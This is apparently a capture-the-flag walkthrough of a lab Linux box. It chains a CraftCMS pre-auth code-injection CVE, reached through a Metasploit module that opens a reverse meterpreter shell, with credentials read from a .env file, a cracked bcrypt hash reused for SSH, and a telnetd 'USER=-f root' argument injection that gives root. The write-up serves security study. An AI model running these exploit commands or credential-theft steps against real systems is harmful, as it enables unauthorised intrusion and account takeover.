## Overview

Orion is an easy-difficulty Linux box hosting a CraftCMS 5.6.16 site behind nginx. The kill chain is: unauthenticated [code injection](https://cwe.mitre.org/data/definitions/94.html) in the CraftCMS image-transform endpoint ([CVE-2025-32432](https://nvd.nist.gov/vuln/detail/CVE-2025-32432)) → cleartext database password in `.env` → offline bcrypt crack + SSH password reuse → GNU inetutils telnetd [argument injection](https://cwe.mitre.org/data/definitions/88.html) ([CVE-2026-24061](https://nvd.nist.gov/vuln/detail/CVE-2026-24061)) for root.

## Recon

```bash
nmap -sCV 10.129.23.251
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://orion.htb/
```

Port 80 redirects to `orion.htb`. After adding the hostname to `/etc/hosts`, the site presents a telecom company landing page. The footer identifies the CMS as **CraftCMS**.

## Enumeration

Visiting `/admin/login` reveals the CraftCMS version in the page footer: **5.6.16**. A quick search confirms this version is vulnerable to pre-auth RCE via [CVE-2025-32432](https://nvd.nist.gov/vuln/detail/CVE-2025-32432).

```bash
ffuf -u http://orion.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic
```

```
admin   [Status: 302] → /admin/login
assets  [Status: 301]
```

The `/admin/login` page also provides the CSRF session cookies needed to exploit the vulnerability — both `CraftSessionId` and `CRAFT_CSRF_TOKEN` are issued on first visit.

## Foothold

**[CVE-2025-32432](https://nvd.nist.gov/vuln/detail/CVE-2025-32432)** — CraftCMS pre-auth [code injection](https://cwe.mitre.org/data/definitions/94.html) via CSRF bypass and Yii object-configuration injection.

The `actions/assets/generate-transform` endpoint processes JSON bodies through the Yii PHP framework's object-configuration system. An attacker-supplied `class` key causes Yii to instantiate an arbitrary PHP class; by choosing `GuzzleHttp\Psr7\FnStream` and setting `_fn_close` to a PHP callable, execution is triggered on object destruction. CSRF validation is bypassed by first fetching `/admin/login` to collect the session cookie and token — both are freely accessible without credentials.

The Metasploit module automates the entire chain:

```bash
msfconsole -q -x "use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432; set rhosts orion.htb; set rport 80; set lhost <lhost>; exploit"
```

This returns a meterpreter session as `www-data`. Upgrade to a PTY:

```bash
# inside meterpreter
shell
script /dev/null -c /bin/bash
```

## User flag

From the `www-data` shell, the CraftCMS environment file is readable:

```bash
cat ~/html/craft/.env
```

```
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=<redacted>
```

Connect to MySQL and dump the users table:

```bash
mysql -u root -p<redacted> -e "select username,email,password from users;" orion
```

```
adam | adam@orion.htb | $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
```

The bcrypt hash cracks quickly against `rockyou.txt`:

```bash
echo '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS' > hash.txt
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

The password is reused for SSH:

```bash
sshpass -p '<redacted>' ssh adam@10.129.23.251
cat ~/user.txt   # HTB{...}
```

## Privilege Escalation

Checking locally-bound services from the `adam` shell:

```bash
netstat -tulnp
```

```
tcp  0  0 127.0.0.1:23  0.0.0.0:*  LISTEN  -
```

Port 23 (telnet) is listening on loopback only. Checking the version:

```bash
telnet --version
# telnet (GNU inetutils) 2.7
```

GNU inetutils 2.7 is vulnerable to **[CVE-2026-24061](https://nvd.nist.gov/vuln/detail/CVE-2026-24061)** — an [argument injection](https://cwe.mitre.org/data/definitions/88.html) through the `USER` environment variable. The `telnetd` daemon passes `USER` directly to `login(1)` without sanitising flag-like values. Setting `USER` to `-f root` causes `telnetd` to invoke `login -f root`, which skips password verification entirely due to the `-f` (pre-authenticated) flag.

```bash
USER="-f root" telnet -a 127.0.0.1
```

```
Linux 5.15.0-177-generic (orion) (pts/0)
Welcome to Ubuntu 22.04.5 LTS...
root@orion:~#
```
